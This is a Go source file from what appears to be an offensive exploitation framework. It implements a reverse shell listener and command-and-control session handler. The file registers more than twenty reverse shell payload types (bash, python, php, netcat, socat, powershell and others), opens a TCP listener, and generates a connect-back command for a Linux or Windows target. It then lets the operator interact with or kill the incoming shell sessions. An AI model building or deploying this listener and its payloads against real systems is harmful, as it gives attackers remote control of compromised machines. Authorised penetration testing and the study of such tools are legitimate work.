package shell

import (
	"fmt"
	"net"
	"time"

	"github.com/Chocapikk/pik/pkg/c2"
	"github.com/Chocapikk/pik/pkg/c2/session"
	"github.com/Chocapikk/pik/pkg/output"
	"github.com/Chocapikk/pik/pkg/payload"
)

// --- Types ---

// Listener is a built-in TCP reverse shell listener with session management.
type Listener struct {
	manager *session.Manager
	lhost   string
	lport   int
}

// Payload generators indexed by registry name.
var payloads = c2.PayloadMap{
	"cmd/bash/reverse_tcp":         payload.Bash,
	"cmd/bash/reverse_tcp_min":     payload.BashMin,
	"cmd/bash/reverse_fd":          payload.BashFD,
	"cmd/bash/reverse_readline":    payload.BashReadLine,
	"cmd/python/reverse_tcp":       payload.Python,
	"cmd/python/reverse_tcp_min":   payload.PythonMin,
	"cmd/python/reverse_tcp_pty":   payload.PythonPTY,
	"cmd/perl/reverse_tcp":         payload.Perl,
	"cmd/ruby/reverse_tcp":         payload.Ruby,
	"cmd/php/reverse_tcp":          payload.PHP,
	"cmd/php/reverse_tcp_min":      payload.PHPMin,
	"cmd/php/reverse_tcp_exec":     payload.PHPExec,
	"cmd/netcat/reverse_tcp":       payload.Netcat,
	"cmd/netcat/reverse_mkfifo":    payload.NetcatMkfifo,
	"cmd/netcat/reverse_openbsd":   payload.NetcatOpenbsd,
	"cmd/socat/reverse_tty":        payload.Socat,
	"cmd/java/reverse_tcp":         payload.Java,
	"cmd/nodejs/reverse_tcp":       payload.NodeJS,
	"cmd/awk/reverse_tcp":          payload.Awk,
	"cmd/lua/reverse_tcp":          payload.Lua,
	"cmd/powershell/reverse_tcp":   payload.PowerShell,
	"cmd/powershell/reverse_conpty": payload.PowerShellConPTY,
}

// --- Constructor ---

func New() *Listener { return &Listener{} }

func (l *Listener) Name() string { return "shell" }

// --- Setup ---

func (l *Listener) Setup(lhost string, lport int) error {
	l.lhost = lhost
	l.lport = lport
	ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", lhost, lport))
	if err != nil {
		return fmt.Errorf("failed to start listener: %w", err)
	}
	l.manager = session.NewManager(ln)
	l.manager.Start()
	output.Status("Listening on %s:%d", lhost, lport)
	return nil
}

// --- Payload ---

// GeneratePayload returns a reverse shell command.
// payloadType maps to the PAYLOAD option (e.g. "reverse_bash", "reverse_python").
// Falls back to bash for linux, powershell for windows.
func (l *Listener) GeneratePayload(targetOS, payloadType string) (string, error) {
	fallback := payload.Bash
	if targetOS == "windows" {
		fallback = payload.PowerShell
	}
	return c2.ResolvePayload(payloads, l.lhost, l.lport, payloadType, fallback)
}

// --- Session ---

// WaitForSession blocks until a session connects or the timeout expires.
// For backward compatibility, it accepts the first session and enters interactive mode.
func (l *Listener) WaitForSession(timeout time.Duration) error {
	sess, err := l.manager.Accept(timeout)
	if err != nil {
		return fmt.Errorf("no session received: %w", err)
	}
	sess.Interact()
	return nil
}

// --- SessionHandler interface ---

// Sessions returns all alive sessions.
func (l *Listener) Sessions() []*session.Session {
	return l.manager.List()
}

// Interact enters interactive mode for the given session.
func (l *Listener) Interact(id int) error {
	return l.manager.Interact(id)
}

// Kill terminates a session by ID.
func (l *Listener) Kill(id int) error {
	return l.manager.Kill(id)
}

// --- Shutdown ---

func (l *Listener) Shutdown() error {
	if l.manager != nil {
		l.manager.Close()
	}
	return nil
}
